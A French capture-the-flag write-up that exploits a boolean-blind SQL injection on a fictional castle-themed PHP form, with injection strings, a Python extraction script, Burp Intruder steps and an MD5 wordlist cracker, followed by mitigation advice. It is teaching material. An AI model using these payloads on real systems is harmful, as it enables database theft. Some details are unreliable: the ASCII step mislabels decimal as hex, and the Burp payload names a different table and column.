---
title: 6 - Injection SQL Boolean Blind & Hash MD5 Faible
next: "/write-ups/wu7"
prev: "/write-ups/wu5"
---

# 🏰 CTF - Injection SQL Boolean Blind & Hash MD5 Faible

## 🎯 Objectif
Bravo ! Tu es dans **Castral-Roc**, dans la salle du mestre où sont stockées des **informations confidentielles des Lannister**. Parmi elles, un livre recensant **les alliés et espions infiltrés** dans les familles de Westeros.

**Mission** : Trouver **l’espion infiltré chez les Stark à Winterfell** et récupérer **son hash MD5**.

### 🔹 Informations de la table `allies`
- `username` : Nom de l’individu (hashé en MD5)
- `relation` : **famille / allié / espion / ennemi**
- `localisation` : Lieu d'opération

📌 **Problèmes de sécurité** :
- **Injection SQL Boolean Blind (`CWE-89`)** permettant d’extraire les données cachées.
- **Stockage MD5 (`CWE-328`)** permettant une attaque par dictionnaire.

📌 **Flag 1** : Le **hash MD5** du nom de l’espion infiltré chez les Stark à Winterfell.
📌 **Flag 2** : Le **nom de l’espion en clair** (`orland mertens`).

---

## ⚙️ Environnement
- **Cible :** `http://lannister.castral-roc.lannisport.south/entourage_lannister.php`
- **Base de données :** `lannisport_db`
- **Données sensibles :** Table `allies`
- **Wordlist fournie** : Liste des 5000 personnes du château

---

## 🚀 Étape 1 : Vérifier la vulnérabilité SQL
Dans le champ **Nom** du formulaire, entre :
```sql
' OR 1=1 #
```
✅ **Si la réponse est `L’utilisateur est un allié`, alors l’injection SQL fonctionne.**


---

## 🔍 Étape 2 : Tester si un espion est infiltré chez les Stark
Dans le champ **Nom**, entre :
```sql
' OR (SELECT COUNT(*) FROM allies WHERE relation='espion' AND localisation='Winterfell') > 0 #
```
✅ **Si la page affiche `L’utilisateur est un allié`, alors un espion est bien présent.**


---

## 🕵️ Étape 3 : Exfiltrer le hash MD5 de l’espion (Boolean Blind)
Nous allons **extraire son hash MD5 caractère par caractère** en utilisant **ASCII() et SUBSTRING()**.

Dans le champ **Nom**, entre :
```sql
' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM allies WHERE relation='espion' AND localisation='Winterfell') = 54 #
```
✅ **Si la page affiche `L’utilisateur est un allié`, alors le premier caractère du hash est `54` (hexadécimal).**

Répète en changeant `1, 1` par `2, 1`, `3, 1`… jusqu'à obtenir le hash MD5 complet !


---

## ⚡ Étape 4 : Automatiser l’extraction avec Python
Pour éviter une extraction manuelle, utilise ce script **Python** :
```python {filename="extract_md5.py"}
import requests

URL = "http://lannister.castral-roc.lannisport.south/entourage_lannister.php"
TRUE_RESPONSE = "L’utilisateur est un allié"
MD5_HASH = ""

for i in range(1, 33):  # Un hash MD5 fait 32 caractères hexadécimaux
    for hex_code in "0123456789abcdef":  # Valeurs hexadécimales
        payload = f"' OR (SELECT SUBSTRING(username, {i}, 1) FROM allies WHERE relation='espion' AND localisation='Winterfell') = '{hex_code}' -- "
        data = {"username": payload}
        response = requests.post(URL, data=data)

        if TRUE_RESPONSE in response.text:
            MD5_HASH += hex_code
            print(f"[+] Caractère {i} trouvé : {hex_code}")
            break

print(f"\n🚀 Hash MD5 de l'espion : {MD5_HASH}")
```

✅ **Exécute le script :**
```bash
python3 extract_md5.py
```
🚀 **Il affichera le hash MD5 complet !**


avec burp : 




BURP : 
1, ouvrir burp, et le browser intégré avec le proxy, 

2, faire requete sur http://lannister.castral-roc.lannisport.south/entourage_lannister.php

pour trouver qqun, par exemple tyrion

3, Envoyer la requete dans l'Intruder 

Mettre ensuite l'attaque en cluster bomb.

après le user on met des payloads : 

username=' AND (SELECT

SUBSTRING(password,§position_carac§,1) FROM users WHERE

relation='espion')=§carac§, ,§position_carac§

4, on va ensuite dans payloads, pour le assigner des valeurs à §position_carac§ et §carac§

pour §position_carac§ on peut entrer des nombres de 1 à 20 et pour §carac§ on peut entrer des lettres de a à z, des lettres de A à Z, et des nombres de 0 à 9

Lancer l'attaque avec start attack

Tirer ensuite pas longueur et on obtient sur chaque ligne un lettre du hash

---

## 🔑 Étape 5 : Trouver le nom de l’espion via une wordlist
Le hash MD5 de l’espion doit être comparé aux 5000 noms fournis.

### 🔹 Utilisation d’un script Python pour comparer le hash
```python
import hashlib

MD5_TARGET = "54cc047eb12722d574b528af105d9e21"  # Hash obtenu
WORDLIST = "names_5000.txt"

with open(WORDLIST, "r", encoding="utf-8") as file:
    for name in file:
        name = name.strip().lower()
        hashed_name = hashlib.md5(name.encode()).hexdigest()

        if hashed_name == MD5_TARGET:
            print(f"[+] Nom de l'espion trouvé : {name}")
            break
```

✅ **Exécute le script :**
```bash
python3 crack_md5.py
```
🚀 **Il affichera `orland mertens` !**


---

## 🏆 Validation du CTF
🚀 **Félicitations, tu as terminé la mission !** 🔥

📌 **Flag 1** : `MD5 du nom de l’espion`
📌 **Flag 2** : `orland mertens`


---

## 🔒 Mitigation & Sécurisation
- **Éviter l’injection SQL** → Utiliser **des requêtes préparées** (`mysqli_stmt_bind_param`).
- **Ne pas stocker les mots de passe / noms sensibles en MD5** → Utiliser `bcrypt`.
- **Limiter les tentatives de requêtes Boolean Blind** → Protection par `fail2ban` et `CAPTCHA`.

---

## 🎯 Conclusion
✔ **Exploitation d’une injection SQL Boolean Blind (`CWE-89`).**
✔ **Exfiltration du hash MD5 de l’espion infiltré chez les Stark.**
✔ **Brute-force du hash MD5 avec une wordlist pour retrouver `orland mertens`.**

🚀 **CTF réussi ! Prêt pour la prochaine mission ?** 🔥